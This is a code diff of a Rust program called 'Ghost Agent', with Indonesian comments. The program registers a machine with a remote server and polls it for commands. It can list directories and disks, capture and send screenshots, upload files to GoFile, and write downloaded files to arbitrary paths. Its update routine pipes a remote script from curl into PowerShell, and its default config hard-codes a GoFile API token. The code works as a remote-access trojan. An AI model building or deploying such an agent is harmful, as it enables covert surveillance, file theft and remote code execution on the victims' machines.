@@ -6,6 +6,7 @@ use std::collections::HashMap;
 use std::time::{Instant, Duration};
 use std::sync::{Arc, Mutex};
 use tokio::time::sleep;
+use tokio::io::AsyncWriteExt; // WAJIB: Buat fungsi stream_to_file
 use serde::{Deserialize, Serialize};
 use sysinfo::{System, SystemExt, DiskExt, CpuExt}; 
 use reqwest::Client;
@@ -17,7 +18,6 @@ use whoami;
 const VERSION: &str = env!("CARGO_PKG_VERSION");
 
 // --- CONFIGURATION STRUCT ---
-// Fix: Tambahkan 'Serialize' agar bisa disimpan kembali ke JSON
 #[derive(Serialize, Deserialize, Clone)]
 struct Config {
     api_url: String,
@@ -35,9 +35,9 @@ struct HeartbeatPayload {
     action: String,
     device_id: String,
     device_name: String,
-    ram_usage: u64, // in MB
-    ram_total: u64, // in MB
-    cpu_usage: f32, // fraction 0.0-100.0
+    ram_usage: u64,
+    ram_total: u64,
+    cpu_usage: f32,
     cpu_brand: String,
     platform: String,
     os_type: String,
@@ -57,9 +57,9 @@ struct CommandResponse {
 #[derive(Deserialize, Debug)]
 #[serde(rename_all = "camelCase")]
 struct PendingCommand {
-    message_id: String, // Will map to "messageId"
+    message_id: String,
     command: String,
-    args: Option<serde_json::Value>, // Changed to Value to be more flexible
+    args: Option<serde_json::Value>,
 }
 
 #[derive(Serialize, Clone)]
@@ -113,7 +113,7 @@ impl DirCache {
 
 #[tokio::main]
 async fn main() {
-    println!("👻 Ghost Agent v{} - Connectivity Debug Active...", VERSION);
+    println!("👻 Ghost Agent v{} - Optimized Stream Mode...", VERSION);
 
     let config = load_or_create_config();
     println!("📱 [READY] Device ID: {}", config.device_id);
@@ -128,14 +128,12 @@ async fn main() {
     if let Some(new_version) = check_for_updates(&client, &config.api_url).await {
         println!("🚀 New version found: v{}. Updating...", new_version);
         trigger_update();
-        // Give time for update process to start and then exit
         sleep(Duration::from_secs(3)).await;
-        // The update script will kill this process anyway, but let's be graceful
         std::process::exit(0);
     }
 
-    // 2. Initial Registration & Heartbeat Task
-    println!("📡 Sending initial heartbeat to register device...");
+    // 2. Initial Registration
+    println!("📡 Sending initial heartbeat...");
     let initial_sys = System::new_all();
     let initial_payload = HeartbeatPayload {
         action: "heartbeat".to_string(),
@@ -151,23 +149,21 @@ async fn main() {
         version: VERSION.to_string(),
     };
     
-    // Attempt initial heartbeat, log but don't panic if it fails
-    match client.post(&config.api_url).json(&initial_payload).send().await {
-        Ok(_) => println!("✅ Initial registration successful!"),
-        Err(e) => println!("⚠️ Initial registration failed: {}. Will retry in background loop.", e),
+    if let Err(e) = client.post(&config.api_url).json(&initial_payload).send().await {
+        println!("⚠️ Initial registration failed: {}. Will retry in loop.", e);
+    } else {
+        println!("✅ Initial registration successful!");
     }
 
     let hb_config = config.clone();
     let hb_client = client.clone();
     
+    // Heartbeat Task
     tokio::spawn(async move {
         let mut sys = System::new_all();
         loop {
             sys.refresh_memory();
             sys.refresh_cpu();
-            
-            let cpu_brand = sys.global_cpu_info().brand().to_string();
-            let cpu_usage = sys.global_cpu_info().cpu_usage();
             
             let payload = HeartbeatPayload {
                 action: "heartbeat".to_string(),
@@ -175,23 +171,22 @@ async fn main() {
                 device_name: hb_config.device_name.clone(),
                 ram_usage: sys.used_memory() / 1024 / 1024,
                 ram_total: sys.total_memory() / 1024 / 1024,
-                cpu_usage,
-                cpu_brand,
+                cpu_usage: sys.global_cpu_info().cpu_usage(),
+                cpu_brand: sys.global_cpu_info().brand().to_string(),
                 platform: format!("{} {}", sys.name().unwrap_or_default(), sys.os_version().unwrap_or_default()),
                 os_type: sys.distribution_id(),
                 user: whoami::username(),
                 version: VERSION.to_string(),
             };
 
-            let res = hb_client.post(&hb_config.api_url).json(&payload).send().await;
-            if let Err(e) = res {
-                println!("❌ Heartbeat Error: {}. Check connectivity or API URL.", e);
+            if let Err(e) = hb_client.post(&hb_config.api_url).json(&payload).send().await {
+                println!("❌ Heartbeat Error: {}", e);
             }
             sleep(Duration::from_millis(hb_config.heartbeat_interval_ms)).await;
         }
     });
 
-    let dir_cache = Arc::new(Mutex::new(DirCache::new(60))); // Cache for 1 minute
+    let dir_cache = Arc::new(Mutex::new(DirCache::new(60)));
 
     // 3. Command Polling Loop
     loop {
@@ -199,18 +194,53 @@ async fn main() {
         std::io::stdout().flush().unwrap();
         match fetch_command(&client, &config).await {
             Ok(Some(cmd)) => {
-                println!("📩 Command: {} Args: {:?}", cmd.command, cmd.args);
+                println!("\n📩 Command: {} Args: {:?}", cmd.command, cmd.args);
                 let cache_clone = Arc::clone(&dir_cache);
                 process_command(&client, &config, cmd, cache_clone).await;
             }
-            Err(e) => println!("⚠️ Poll Error: {}", e),
+            Err(e) => println!("\n⚠️ Poll Error: {}", e),
             _ => {}
         }
         sleep(Duration::from_millis(config.poll_interval_ms)).await;
     }
 }
 
-// --- UTILS ---
+// --- UTILS & HELPERS ---
+
+// Helper 1: Extract direct link from HTML (Optimized)
+fn extract_direct_link(html: &str) -> Option<String> {
+    if let Some(idx) = html.find("tmpfiles.org/dl/") {
+        let prefix = &html[0..idx];
+        if let Some(start_quote) = prefix.rfind('"').or_else(|| prefix.rfind('\'')).or_else(|| prefix.rfind(' ')) {
+            let start = start_quote + 1;
+            let suffix = &html[idx..];
+            if let Some(end_quote) = suffix.find('"').or_else(|| suffix.find('\'')).or_else(|| suffix.find(' ')) {
+                let end = idx + end_quote;
+                let mut new_url = html[start..end].to_string();
+                if new_url.starts_with("//") {
+                    new_url = format!("https:{}", new_url);
+                }
+                return Some(new_url);
+            }
+        }
+    }
+    None
+}
+
+// Helper 2: Stream downloader (Memory Efficient for 4GB RAM)
+async fn stream_to_file(mut resp: reqwest::Response, path: &str) -> Result<u64, String> {
+    let mut file = tokio::fs::File::create(path).await
+        .map_err(|e| format!("Failed to create file: {}", e))?;
+
+    let mut total_size: u64 = 0;
+    while let Some(chunk) = resp.chunk().await.map_err(|e| format!("Net error: {}", e))? {
+        file.write_all(&chunk).await
+            .map_err(|e| format!("Write error: {}", e))?;
+        total_size += chunk.len() as u64;
+    }
+    file.flush().await.map_err(|e| format!("Flush error: {}", e))?;
+    Ok(total_size)
+}
 
 fn load_or_create_config() -> Config {
     let path = "config.json";
@@ -224,45 +254,34 @@ fn load_or_create_config() -> Config {
         (create_default_config(path), true)
     };
 
-    // Auto-generate Device ID if missing (and it's not a newly created config which already has one)
     if !is_new && cfg.device_id.is_empty() {
         cfg.device_id = Uuid::new_v4().to_string();
         save_config(path, &cfg);
-        println!("🆔 Generated and saved new Device ID: {}", cfg.device_id);
     }
 
-    // 🚀 TRUE AUTO-ADAPT:
     if cfg!(debug_assertions) {
-        println!("🛠️  [DEV MODE] Auto-switching API to http://127.0.0.1:3000/api/ghost");
+        println!("🛠️  [DEV MODE] Using localhost API");
         cfg.api_url = "http://127.0.0.1:3000/api/ghost".to_string();
-    } else {
-        println!("🌐 [PROD MODE] Connecting to: {}", cfg.api_url);
     }
-    
     cfg
 }
 
 fn create_default_config(path: &str) -> Config {
-    let username = whoami::username();
-    let devicename = whoami::devicename();
-    
     let default_cfg = Config {
         api_url: "https://erzysh.vercel.app/api/ghost".to_string(),
-        device_name: format!("{}-{}", username, devicename),
+        device_name: format!("{}-{}", whoami::username(), whoami::devicename()),
         heartbeat_interval_ms: 5000,
         poll_interval_ms: 2000,
         gofile_token: "eNi42POOnDBiGBWf9LfDOP2Yjoe7DqQy".to_string(),
         device_id: Uuid::new_v4().to_string(),
     };
-
     save_config(path, &default_cfg);
     default_cfg
 }
 
 fn save_config(path: &str, config: &Config) {
     let json = serde_json::to_string_pretty(config).unwrap();
-    let mut file = fs::File::create(path).expect("Gagal membuat file config");
-    file.write_all(json.as_bytes()).expect("Gagal menulis config");
+    fs::write(path, json).expect("Gagal menulis config");
 }
 
 async fn fetch_command(client: &Client, config: &Config) -> Result<Option<PendingCommand>, Box<dyn std::error::Error>> {
@@ -272,15 +291,10 @@ async fn fetch_command(client: &Client, config: &Config) -> Result<Option<Pendin
     if resp.status().is_success() {
         let text = resp.text().await?;
         if text.trim().is_empty() || text == "null" { return Ok(None); }
-        
         match serde_json::from_str::<PendingCommand>(&text) {
             Ok(cmd) => return Ok(Some(cmd)),
-            Err(e) => {
-                println!("❌ JSON Parse Error: {}. Raw text: {}", e, text);
-            }
+            Err(e) => println!("❌ JSON Parse Error: {}", e),
         }
-    } else {
-        println!("⚠️ Poll Status: {} for {}", resp.status(), url);
     }
     Ok(None)
 }
@@ -293,7 +307,7 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand, 
         "LS" => {
             let mut path_str = "C:\\".to_string();
             let mut force = false;
-
+            
             if let Some(args) = &cmd.args {
                 if let Some(s) = args.as_str() {
                     path_str = s.to_string();
@@ -306,70 +320,54 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand, 
             }
             
             let path = Path::new(&path_str);
-            
             if !path.exists() {
                 status = "ERROR".to_string();
                 response_data = Some(serde_json::json!({ "message": "Path not found" }));
             } else {
-                // Check Cache First (Unless force is true)
-                let cached_files = if force {
-                    None
-                } else {
-                    let cache_lock = cache.lock().unwrap();
-                    cache_lock.get(&path_str)
-                };
-
+                let cached_files = if force { None } else { cache.lock().unwrap().get(&path_str) };
+                
                 if let Some(files) = cached_files {
-                    println!("⚡ [CACHE] Returning cached results for: {}", path_str);
+                    println!("⚡ [CACHE] Hit: {}", path_str);
                     response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
                 } else {
                     match fs::read_dir(path) {
                         Ok(entries) => {
                             let mut files: Vec<FileEntry> = Vec::new();
-                            for entry in entries {
-                                if let Ok(entry) = entry {
-                                    let name = entry.file_name().to_string_lossy().to_string();
-                                    if let Ok(meta) = entry.metadata() {
-                                        files.push(FileEntry {
-                                            name,
-                                            kind: if meta.is_dir() { "dir".to_string() } else { "file".to_string() },
-                                            size: if meta.is_dir() { "-".to_string() } else { format_size(meta.len()) }
-                                        });
-                                    } else {
-                                        files.push(FileEntry { name, kind: "unknown".to_string(), size: "?".to_string() });
-                                    }
-                                }
+                            for entry in entries.flatten() {
+                                let name = entry.file_name().to_string_lossy().to_string();
+                                let (kind, size) = match entry.metadata() {
+                                    Ok(m) => (
+                                        if m.is_dir() { "dir" } else { "file" }.to_string(),
+                                        if m.is_dir() { "-".to_string() } else { format_size(m.len()) }
+                                    ),
+                                    _ => ("unknown".to_string(), "?".to_string())
+                                };
+                                files.push(FileEntry { name, kind, size });
                             }
-                            files.sort_by(|a, b| {
-                                if a.kind == b.kind { a.name.cmp(&b.name) } 
-                                else if a.kind == "dir" { std::cmp::Ordering::Less } 
-                                else { std::cmp::Ordering::Greater }
+                            // Sort: Dirs first
+                            files.sort_by(|a, b| match (a.kind.as_str(), b.kind.as_str()) {
+                                ("dir", "file") => std::cmp::Ordering::Less,
+                                ("file", "dir") => std::cmp::Ordering::Greater,
+                                _ => a.name.cmp(&b.name),
                             });
-
-                            // Save to Cache
-                            {
-                                let mut cache_lock = cache.lock().unwrap();
-                                cache_lock.set(path_str.clone(), files.clone());
-                            }
-
+                            
+                            cache.lock().unwrap().set(path_str.clone(), files.clone());
                             response_data = Some(serde_json::json!({ "current_path": path_str, "files": files }));
-                        }
+                        },
                         Err(e) => {
                             status = "ERROR".to_string();
-                            response_data = Some(serde_json::json!({ "message": format!("Access Denied: {}", e) }));
+                            response_data = Some(serde_json::json!({ "message": e.to_string() }));
                         }
                     }
                 }
             }
         },
         "SCREENSHOT" => {
-            let screens = Screen::all().unwrap_or_default();
-            if let Some(screen) = screens.first() {
+            if let Some(screen) = Screen::all().unwrap_or_default().first() {
                 match screen.capture() {
                     Ok(image) => {
                         let mut cursor = std::io::Cursor::new(Vec::new());
                         let _ = image.write_to(&mut cursor, image::ImageOutputFormat::Png);
-                        
                         let b64 = general_purpose::STANDARD.encode(cursor.get_ref());
                         response_data = Some(serde_json::json!({ "image": b64 }));
                     },
@@ -378,23 +376,24 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand, 
                         response_data = Some(serde_json::json!({ "message": e.to_string() }));
                     }
                 }
+            } else {
+                status = "ERROR".to_string();
+                response_data = Some(serde_json::json!({ "message": "No screens found" }));
             }
         },
         "LIST_DISKS" => {
             let mut sys = System::new_all();
             sys.refresh_disks_list();
             sys.refresh_disks();
-            
-            let mut disks: Vec<serde_json::Value> = Vec::new();
-            for disk in sys.disks() {
-                disks.push(serde_json::json!({
-                    "name": disk.name().to_string_lossy().to_string(),
-                    "mount_point": disk.mount_point().to_string_lossy().to_string(),
+            let disks: Vec<serde_json::Value> = sys.disks().iter().map(|disk| {
+                serde_json::json!({
+                    "name": disk.name().to_string_lossy(),
+                    "mount_point": disk.mount_point().to_string_lossy(),
                     "total_space": format_size(disk.total_space()),
                     "available_space": format_size(disk.available_space()),
-                    "file_system": String::from_utf8_lossy(disk.file_system()).to_string(),
-                }));
-            }
+                    "file_system": String::from_utf8_lossy(disk.file_system()),
+                })
+            }).collect();
             response_data = Some(serde_json::json!({ "disks": disks }));
         },
         "GET_FILE" => {
@@ -411,159 +410,120 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand, 
             }
         },
        "PUT_FILE" => {
-            println!("📥 Processing PUT_FILE command...");
-            if let Some(json) = cmd.args {
-                let url = json["url"].as_str().unwrap_or_default();
-                let dest = json["dest"].as_str().unwrap_or_default();
-                
-                if url.is_empty() || dest.is_empty() {
-                    status = "ERROR".to_string();
-                    response_data = Some(serde_json::json!({ "message": "Missing 'url' or 'dest' in arguments" }));
-                } else {
-                    println!("📡 Downloading from: {}", url);
-                    println!("🎯 Destination: {}", dest);
-
-                    if let Some(parent) = Path::new(dest).parent() {
-                        let parent_str = parent.to_string_lossy().to_string();
-                        if let Err(e) = fs::create_dir_all(parent) {
-                            println!("⚠️ Failed to create directory: {}", e);
+            println!("📥 Processing PUT_FILE (Stream Mode)...");
+            
+            // --- FIX PARSING ARGUMENT ---
+            let (url, dest) = match &cmd.args {
+                Some(val) => {
+                    // Cek 1: Apakah args dikirim sebagai STRING ter-encode? (Kasus lo sekarang)
+                    if let Some(args_str) = val.as_str() {
+                        match serde_json::from_str::<serde_json::Value>(args_str) {
+                            Ok(parsed) => (
+                                parsed["url"].as_str().unwrap_or("").trim().to_string(),
+                                parsed["dest"].as_str().unwrap_or("").trim().to_string()
+                            ),
+                            Err(_) => ("".to_string(), "".to_string())
                         }
-                        // Invalidate cache for parent directory
-                        {
-                            let mut cache_lock = cache.lock().unwrap();
-                            cache_lock.invalidate(&parent_str);
-                            println!("🧹 [CACHE] Invalidated: {}", parent_str);
-                        }
+                    } 
+                    // Cek 2: Apakah args dikirim sebagai OBJECT murni? (Jaga-jaga)
+                    else {
+                        (
+                            val["url"].as_str().unwrap_or("").trim().to_string(),
+                            val["dest"].as_str().unwrap_or("").trim().to_string()
+                        )
                     }
+                },
+                None => ("".to_string(), "".to_string())
+            };
+            // ---------------------------
 
-                    let referer = url.replace("/dl/", "/");
-                    let req = client.get(url)
-                        .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
-                        .header("Accept-Language", "en-US,en;q=0.9")
-                        .header("Referer", referer)
-                        .header("Upgrade-Insecure-Requests", "1")
-                        .header("Connection", "keep-alive");
+            println!("🔍 URL: {}\n📂 Dest: {}", url, dest);
 
-                    match req.send().await {
-                        Ok(resp) => {
-                            let final_url = resp.url().clone();
-                            if resp.status().is_success() {
-                                let content_type = resp.headers()
-                                    .get("content-type")
-                                    .and_then(|v| v.to_str().ok())
-                                    .unwrap_or("none");
-                                let content_length = resp.content_length().unwrap_or(0);
+            if url.is_empty() || dest.is_empty() {
+                // ... sisa logic ke bawah SAMA PERSIS ...
+                status = "ERROR".to_string();
+                response_data = Some(serde_json::json!({ "message": "Missing 'url' or 'dest' (Parse Failed)" }));
+            } else {
+                // Jangan lupa variabel 'url' dan 'dest' sekarang tipe-nya String (bukan &str)
+                // Jadi di bawah nanti pass-nya pake referensi &url atau &dest
+                println!("📡 Stream Target: {}\n🎯 Dest: {}", url, dest);
+
+                if let Some(parent) = Path::new(&dest).parent() { // Pake &dest
+                    let _ = fs::create_dir_all(parent);
+                    cache.lock().unwrap().invalidate(&parent.to_string_lossy().to_string());
+                }
+
+                let referer = url.replace("/dl/", "/");
+                let req = client.get(&url) // Pake &url
+                    .header("Referer", referer)
+                    .header("Upgrade-Insecure-Requests", "1")
+                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+                
+                // ... Lanjutannya copy paste logic stream yang sebelumnya ...
+                match req.send().await {
+                    Ok(resp) if resp.status().is_success() => {
+                        let content_type = resp.headers()
+                            .get("content-type")
+                            .and_then(|v| v.to_str().ok())
+                            .unwrap_or("")
+                            .to_string();
+
+                        if content_type.contains("text/html") {
+                            println!("📄 HTML detected. Parsing...");
+                            let body_text = resp.text().await.unwrap_or_default();
+                            
+                            if let Some(direct_url) = extract_direct_link(&body_text) {
+                                println!("🔗 Redirecting stream to: {}", direct_url);
+                                let retry_req = client.get(&direct_url).header("Referer", &url); // Pake &url
                                 
-                                println!("📦 Received response from: {}", final_url);
-                                println!("📦 Type: {}, Size: {} bytes", content_type, content_length);
-
-                                if content_type.contains("text/html") {
-                                     println!("⚠️ Response is HTML. Attempting to parse for direct link...");
-                                     match resp.bytes().await {
-                                         Ok(body_bytes) => {
-                                             let body_str = String::from_utf8_lossy(&body_bytes);
-                                             let mut new_url = String::new();
-                                             
-                                             if let Some(idx) = body_str.find("tmpfiles.org/dl/") {
-                                                 let prefix = &body_str[0..idx];
-                                                 if let Some(start_quote) = prefix.rfind('"').or_else(|| prefix.rfind('\'')).or_else(|| prefix.rfind(' ')) {
-                                                     let start = start_quote + 1;
-                                                     let suffix = &body_str[idx..];
-                                                     if let Some(end_quote) = suffix.find('"').or_else(|| suffix.find('\'')).or_else(|| suffix.find(' ')) {
-                                                         let end = idx + end_quote;
-                                                         new_url = body_str[start..end].to_string();
-                                                         if new_url.starts_with("//") {
-                                                             new_url = format!("https:{}", new_url);
-                                                         }
-                                                     }
-                                                 }
-                                             }
-
-                                             if !new_url.is_empty() {
-                                                 println!("🔗 Found direct link in HTML: {}", new_url);
-                                                 let retry_req = client.get(&new_url).header("Referer", url);
-                                                 match retry_req.send().await {
-                                                     Ok(retry_resp) => {
-                                                         if retry_resp.status().is_success() {
-                                                             match retry_resp.bytes().await {
-                                                                 Ok(retry_bytes) => {
-                                                                     if std::fs::write(dest, &retry_bytes).is_ok() {
-                                                                         println!("✅ File saved successfully from direct link!");
-                                                                         response_data = Some(serde_json::json!({ "dest": dest, "recovered": true }));
-                                                                         status = "DONE".to_string();
-                                                                     } else {
-                                                                         status = "ERROR".to_string();
-                                                                         response_data = Some(serde_json::json!({ "message": "Failed to write retry content" })); 
-                                                                     }
-                                                                 },
-                                                                 Err(e) => {
-                                                                     status = "ERROR".to_string();
-                                                                     response_data = Some(serde_json::json!({ "message": format!("Retry byte error: {}", e) }));
-                                                                 }
-                                                             }
-                                                         } else {
-                                                             status = "ERROR".to_string();
-                                                             response_data = Some(serde_json::json!({ "message": format!("Retry failed: HTTP {}", retry_resp.status()) }));
-                                                         }
-                                                     },
-                                                     Err(e) => {
-                                                         status = "ERROR".to_string();
-                                                         response_data = Some(serde_json::json!({ "message": format!("Retry request failed: {}", e) }));
-                                                     }
-                                                 }
-                                             } else {
-                                                 println!("❌ Could not find /dl/ link in HTML");
-                                                 status = "ERROR".to_string();
-                                                 response_data = Some(serde_json::json!({ "message": "HTML received but no direct link found" }));
-                                             }
-                                         },
-                                         Err(e) => {
-                                             status = "ERROR".to_string();
-                                             response_data = Some(serde_json::json!({ "message": format!("Failed to read HTML body: {}", e) }));
-                                         }
-                                     }
-                                } else {
-                                    match resp.bytes().await {
-                                        Ok(bytes) => {
-                                            if bytes.is_empty() {
+                                match retry_req.send().await {
+                                    Ok(retry_resp) if retry_resp.status().is_success() => {
+                                        match stream_to_file(retry_resp, &dest).await { // Pake &dest
+                                            Ok(size) => {
+                                                status = "DONE".to_string();
+                                                response_data = Some(serde_json::json!({ "dest": dest, "size": size, "recovered": true }));
+                                            },
+                                            Err(e) => {
                                                 status = "ERROR".to_string();
-                                                response_data = Some(serde_json::json!({ "message": "Downloaded file is empty" }));
-                                            } else if let Err(e) = std::fs::write(dest, &bytes) {
-                                                status = "ERROR".to_string();
-                                                response_data = Some(serde_json::json!({ "message": format!("Write error: {}", e) }));
-                                                println!("❌ Write error: {}", e);
-                                            } else {
-                                                println!("✅ File saved successfully! ({} bytes)", bytes.len());
-                                                response_data = Some(serde_json::json!({ "dest": dest, "size": bytes.len() }));
+                                                response_data = Some(serde_json::json!({ "message": e }));
                                             }
-                                        },
-                                        Err(e) => {
-                                            status = "ERROR".to_string();
-                                            response_data = Some(serde_json::json!({ "message": format!("Byte stream error: {}", e) }));
-                                            println!("❌ Byte stream error: {}", e);
                                         }
+                                    },
+                                    _ => {
+                                        status = "ERROR".to_string();
+                                        response_data = Some(serde_json::json!({ "message": "Direct link request failed" }));
                                     }
                                 }
                             } else {
                                 status = "ERROR".to_string();
-                                let err_msg = format!("Download failed (HTTP {}): The link might be expired or restricted.", resp.status());
-                                response_data = Some(serde_json::json!({ "message": err_msg }));
-                                println!("❌ {} at {}", err_msg, final_url);
+                                response_data = Some(serde_json::json!({ "message": "No direct link found in HTML" }));
                             }
-                        },
-                        Err(e) => {
-                            status = "ERROR".to_string();
-                            response_data = Some(serde_json::json!({ "message": format!("Request fault: {}", e) }));
-                            println!("❌ Request fault: {}", e);
+                        } else {
+                            println!("🌊 Starting direct stream...");
+                            match stream_to_file(resp, &dest).await { // Pake &dest
+                                Ok(size) => {
+                                    status = "DONE".to_string();
+                                    response_data = Some(serde_json::json!({ "dest": dest, "size": size }));
+                                },
+                                Err(e) => {
+                                    status = "ERROR".to_string();
+                                    response_data = Some(serde_json::json!({ "message": e }));
+                                }
+                            }
                         }
+                    },
+                    // ... Error handling sisa sama ...
+                    Ok(resp) => {
+                         status = "ERROR".to_string();
+                         response_data = Some(serde_json::json!({ "message": format!("HTTP {}", resp.status()) }));
+                    },
+                    Err(e) => {
+                         status = "ERROR".to_string();
+                         response_data = Some(serde_json::json!({ "message": format!("Request Error: {}", e) }));
                     }
                 }
-            } else {
-                status = "ERROR".to_string();
-                response_data = Some(serde_json::json!({ "message": "No arguments provided for PUT_FILE" }));
-                println!("❌ No arguments provided");
             }
-        }
+        },
         _ => {
             status = "ERROR".to_string();
             response_data = Some(serde_json::json!({ "message": "Unknown command" }));
@@ -578,14 +538,8 @@ async fn process_command(client: &Client, config: &Config, cmd: PendingCommand, 
         data: response_data,
     };
 
-    let res = client.post(&config.api_url).json(&payload).send().await;
-    match res {
-        Ok(resp) => {
-            println!("📤 Response sent (Status: {}). API returned: {}", payload.status, resp.status());
-        },
-        Err(e) => {
-            println!("❌ Failed to send response: {}", e);
-        }
+    if let Err(e) = client.post(&config.api_url).json(&payload).send().await {
+        println!("❌ Failed to send response: {}", e);
     }
 }
 
@@ -601,7 +555,6 @@ fn format_size(bytes: u64) -> String {
 }
 
 async fn upload_to_gofile(client: &Client, file_path: &str, token: &str) -> Result<String, Box<dyn std::error::Error>> {
-    // Fix: tokio_util sekarang sudah diimport di Cargo.toml
     use tokio_util::codec::{BytesCodec, FramedRead};
     use tokio::fs::File;
     
@@ -623,7 +576,6 @@ async fn upload_to_gofile(client: &Client, file_path: &str, token: &str) -> Resu
         .await?;
 
     let json: serde_json::Value = upload_resp.json().await?;
-    
     if json["status"].as_str().unwrap_or("") == "ok" {
         Ok(json["data"]["downloadPage"].as_str().unwrap_or("").to_string())
     } else {
@@ -633,30 +585,18 @@ async fn upload_to_gofile(client: &Client, file_path: &str, token: &str) -> Resu
 
 async fn check_for_updates(client: &Client, api_url: &str) -> Option<String> {
     let url = format!("{}?action=get_version", api_url);
-    match client.get(&url).send().await {
-        Ok(resp) => {
-            if let Ok(json) = resp.json::<serde_json::Value>().await {
-                if let Some(latest_version) = json["version"].as_str() {
-                    if latest_version != VERSION {
-                        return Some(latest_version.to_string());
-                    }
-                }
+    if let Ok(resp) = client.get(&url).send().await {
+        if let Ok(json) = resp.json::<serde_json::Value>().await {
+            if let Some(latest) = json["version"].as_str() {
+                if latest != VERSION { return Some(latest.to_string()); }
             }
         }
-        Err(e) => println!("⚠️ Failed to check version: {}", e),
     }
     None
 }
 
 fn trigger_update() {
-    println!("🔄 Triggering powershell update script...");
-    // PowerShell command to download and run the setup script
-    // Note: The script will handle killing the current process and restarting it
-    let cmd = "curl -sL https://erzysh.vercel.app/ghost-setup | powershell";
-    
-    if let Err(e) = std::process::Command::new("powershell")
-        .args(&["-Command", cmd])
-        .spawn() {
-        println!("❌ Failed to trigger update: {}", e);
-    }
+    let _ = std::process::Command::new("powershell")
+        .args(&["-Command", "curl -sL https://erzysh.vercel.app/ghost-setup | powershell"])
+        .spawn();
 }
